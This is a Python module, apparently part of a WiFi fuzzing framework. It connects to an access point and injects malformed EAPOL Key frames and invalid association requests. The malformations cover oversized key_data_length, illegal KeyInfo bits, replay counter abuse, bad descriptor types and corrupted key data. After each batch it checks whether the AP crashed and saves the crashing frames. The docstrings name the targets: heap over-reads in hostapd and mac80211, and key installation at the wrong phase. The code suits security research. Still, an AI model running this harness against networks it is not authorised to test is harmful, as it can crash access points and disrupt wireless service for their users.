"""
Post-connection EAPOL Key frame injection — Phase 3 grammar-aware fuzzing.

Connects to AP, then injects malformed EAPOL Key frames while associated.
The AP must process EAPOL frames from authenticated STAs — they bypass
the 802.11 association state gate that drops all pre-auth frames.

Attack surface:
  - wpa_supplicant/hostapd EAPOL Key parser (userspace)
  - mac80211 EAPOL demux path (kernel)
  - key_data_length over-read → heap read beyond allocation
  - KeyInfo state machine violations → install at wrong phase
  - Replay counter bypass → anti-replay state confusion

Run:
  sudo python3 run.py wlan0 eapol-key-data-len  --config ~/iith/iith_wpa.conf
  sudo python3 run.py wlan0 eapol-key-info       --config ~/iith/iith_wpa.conf
  sudo python3 run.py wlan0 eapol-replay-counter --config ~/iith/iith_wpa.conf
  sudo python3 run.py wlan0 eapol-descriptor     --config ~/iith/iith_wpa.conf
  sudo python3 run.py wlan0 eapol-key-data       --config ~/iith/iith_wpa.conf
  sudo python3 run.py wlan0 eapol-cap-combos     --config ~/iith/iith_wpa.conf
"""
import struct, time
from scapy.layers.dot11 import Dot11, Dot11QoS
from scapy.layers.l2 import Ether, LLC, SNAP
from scapy.all import raw

from dependencies.libwifi.wifi import log, STATUS
from library.testcase import Trigger, Action, Test
from fuzz.eapol_mutator import (
    all_eapol_mutations,
    mutations_key_data_length, mutations_key_info,
    mutations_replay_counter, mutations_descriptor_type,
    mutations_key_data_content,
)
from fuzz.ie_mutator import mutations_capability_combos
from fuzz.mutator import ie_build, ie_wrong_length


# ── Shared injection helpers ───────────────────────────────────────────────────

_inj_count   = 0
_last_label  = ''
_crash_frames = []

def _send_eapol(station, eapol_bytes: bytes, label: str, check_every: int = 15):
    """
    Wrap EAPOL bytes in 802.11 QoS Data + LLC/SNAP and inject encrypted.

    EAPOL over 802.11:
      Dot11(QoS Data) / LLC(dsap=0xAA, ssap=0xAA, ctrl=3) / SNAP(OUI=0, code=0x888E) / eapol_bytes
    """
    global _inj_count, _last_label
    _inj_count += 1
    _last_label = label

    station.sn = (station.sn + 1) & 4095

    dot11 = Dot11(type=2, subtype=8, FCfield=1,
                  addr1=station.bss, addr2=station.mac, addr3=station.bss,
                  SC=station.sn << 4)
    dot11 /= Dot11QoS(TID=0)

    # LLC + SNAP header for EAPOL EtherType
    llc_snap = LLC(dsap=0xAA, ssap=0xAA, ctrl=3) / SNAP(OUI=0, code=0x888E)
    frame = dot11 / llc_snap / raw(eapol_bytes)

    if station.tk:
        frame = station.encrypt(frame, station.tk)

    station.inject_mon(frame)
    time.sleep(0.05)

    if _inj_count % check_every == 0:
        try:
            status = station.wpaspy_command('STATUS')
            alive  = 'wpa_state=COMPLETED' in status
        except Exception:
            alive = False

        if not alive:
            log(STATUS,
                f'[EFFECT] AP disconnected! label={label} count={_inj_count}',
                color='red')
            import os
            ts = int(time.time())
            path = f'/tmp/eapol_crash_{ts}_{label[:40]}.bin'
            try:
                with open(path, 'wb') as f:
                    f.write(bytes(frame) + b'\n---\n' + eapol_bytes)
                log(STATUS, f'[CRASH FRAME] {path}', color='red')
                _crash_frames.append((label, path))
            except Exception:
                pass
        else:
            log(STATUS, f'  [alive] {_inj_count} frames label={label}', color='cyan')


# ── Test 1: key_data_length over-read ─────────────────────────────────────────

class EapolKeyDataLen(Test):
    """
    Inject EAPOL Key frames with key_data_length > actual data.

    PRIMARY TARGET: over-read in wpa_supplicant/mac80211 WPA key parser.

    When AP receives msg3 with key_data_length claiming more bytes than
    present, parser reads past actual frame into adjacent memory.
    Key_data_length=65535 forces maximum over-read.
    """
    name = 'eapol-key-data-len'
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            Action(trigger=Trigger.Connected, action=Action.Function),
            Action(trigger=Trigger.Disconnected, action=Action.Terminate),
        ])

    def run(self, station):
        log(STATUS, '[eapol-key-data-len] Connected. Injecting EAPOL key_data_length mutations.',
            color='green')
        for label, eapol in mutations_key_data_length(replay_counter=station.pn + 100):
            log(STATUS, f'  {label}')
            _send_eapol(station, eapol, label)

        log(STATUS, f'[eapol-key-data-len] Done. {_inj_count} frames. Crashes: {len(_crash_frames)}',
            color='green')

    def generate(self, station):
        self.actions[0].set_function(self.run)
        self.actions[0].set_terminate(delay=2)


# ── Test 2: KeyInfo field mutations ───────────────────────────────────────────

class EapolKeyInfo(Test):
    """
    Inject EAPOL Key frames with invalid KeyInfo bits.

    KeyInfo controls install/ack/MIC/encrypt bits. Sending install=1 on
    msg1 (before handshake) forces AP to install key prematurely.
    version=0 hits undefined algorithm code path.
    """
    name = 'eapol-key-info'
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            Action(trigger=Trigger.Connected, action=Action.Function),
            Action(trigger=Trigger.Disconnected, action=Action.Terminate),
        ])

    def run(self, station):
        log(STATUS, '[eapol-key-info] Connected. Injecting KeyInfo mutations.', color='green')
        for label, eapol in mutations_key_info(replay_counter=station.pn + 200):
            log(STATUS, f'  {label}')
            _send_eapol(station, eapol, label)

        log(STATUS, f'[eapol-key-info] Done.', color='green')

    def generate(self, station):
        self.actions[0].set_function(self.run)
        self.actions[0].set_terminate(delay=2)


# ── Test 3: Replay counter ────────────────────────────────────────────────────

class EapolReplayCounter(Test):
    """
    Inject EAPOL Key frames with invalid replay counters.

    Anti-replay: AP should reject frames with counter <= last seen.
    Flood with same counter → state machine exhaustion.
    Counter=max → wrap-around handling.
    """
    name = 'eapol-replay-counter'
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            Action(trigger=Trigger.Connected, action=Action.Function),
            Action(trigger=Trigger.Disconnected, action=Action.Terminate),
        ])

    def run(self, station):
        log(STATUS, '[eapol-replay-counter] Connected. Injecting replay counter mutations.',
            color='green')
        last_rc = station.pn + 10
        for label, eapol in mutations_replay_counter(last_counter=last_rc):
            log(STATUS, f'  {label}')
            _send_eapol(station, eapol, label, check_every=10)

        log(STATUS, f'[eapol-replay-counter] Done.', color='green')

    def generate(self, station):
        self.actions[0].set_function(self.run)
        self.actions[0].set_terminate(delay=2)


# ── Test 4: Descriptor type ───────────────────────────────────────────────────

class EapolDescriptor(Test):
    """
    Inject EAPOL Key frames with invalid descriptor types.

    Descriptor type=2 (WPA2) or 254 (WPA1). Values like 0, 1, 3, 255
    may hit unhandled switch/case in EAPOL parser. Especially 0 and 255.
    """
    name = 'eapol-descriptor'
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            Action(trigger=Trigger.Connected, action=Action.Function),
            Action(trigger=Trigger.Disconnected, action=Action.Terminate),
        ])

    def run(self, station):
        log(STATUS, '[eapol-descriptor] Connected. Injecting descriptor type mutations.',
            color='green')
        for label, eapol in mutations_descriptor_type(replay_counter=station.pn + 300):
            log(STATUS, f'  {label}')
            _send_eapol(station, eapol, label)

        log(STATUS, f'[eapol-descriptor] Done.', color='green')

    def generate(self, station):
        self.actions[0].set_function(self.run)
        self.actions[0].set_terminate(delay=2)


# ── Test 5: key_data content ──────────────────────────────────────────────────

class EapolKeyData(Test):
    """
    Inject EAPOL Key frames with malformed key_data content.

    key_data in msg3 contains encrypted KDE (Key Data Encapsulation):
      GTK KDE + RSNIE. Corrupting the inner structure tests the parser
      that runs AFTER decryption. Nested RSNE with wrong length is
      particularly interesting — parser inside parser.
    """
    name = 'eapol-key-data'
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            Action(trigger=Trigger.Connected, action=Action.Function),
            Action(trigger=Trigger.Disconnected, action=Action.Terminate),
        ])

    def run(self, station):
        log(STATUS, '[eapol-key-data] Connected. Injecting key_data content mutations.',
            color='green')
        for label, eapol in mutations_key_data_content(replay_counter=station.pn + 400):
            log(STATUS, f'  {label}')
            _send_eapol(station, eapol, label)

        log(STATUS, f'[eapol-key-data] Done.', color='green')

    def generate(self, station):
        self.actions[0].set_function(self.run)
        self.actions[0].set_terminate(delay=2)


# ── Test 6: Invalid capability combinations in AssocReq ───────────────────────

class EapolCapCombos(Test):
    """
    Send AssocReq frames with semantically invalid IE combinations.

    These violate cross-field constraints:
      - VHT IE without HT IE (HT required for VHT)
      - WPA3 SAE without MFP required (spec violation)
      - Dual conflicting RSN IEs (which does parser use?)
      - TKIP pairwise with CCMP group (downgrade)

    Not EAPOL — these are management frame IE combos, but grouped here
    as Phase 3 grammar-aware semantic mutations.
    """
    name = 'eapol-cap-combos'
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            Action(trigger=Trigger.Connected, action=Action.Function),
            Action(trigger=Trigger.Disconnected, action=Action.Terminate),
        ])

    def run(self, station):
        import struct as _struct
        from scapy.layers.dot11 import Dot11, Dot11AssoReq, Dot11Elt

        log(STATUS, '[eapol-cap-combos] Connected. Injecting cap combo AssocReqs.',
            color='green')

        fixed = _struct.pack('<HH', 1073, 10)  # capability + listen_interval

        for label, ie_blob in mutations_capability_combos():
            p = Dot11(type=0, subtype=0, FCfield=0,
                      addr1=station.bss, addr2=station.mac, addr3=station.bss)
            p /= fixed + ie_blob
            station.inject_mon(p)
            log(STATUS, f'  {label}')
            time.sleep(0.05)

            # Check liveness every 5 frames
            if _inj_count % 5 == 0:
                try:
                    status = station.wpaspy_command('STATUS')
                    alive  = 'wpa_state=COMPLETED' in status
                except Exception:
                    alive = False
                if not alive:
                    log(STATUS, f'[EFFECT] Disconnect after cap-combo label={label}', color='red')

        log(STATUS, f'[eapol-cap-combos] Done.', color='green')

    def generate(self, station):
        self.actions[0].set_function(self.run)
        self.actions[0].set_terminate(delay=2)
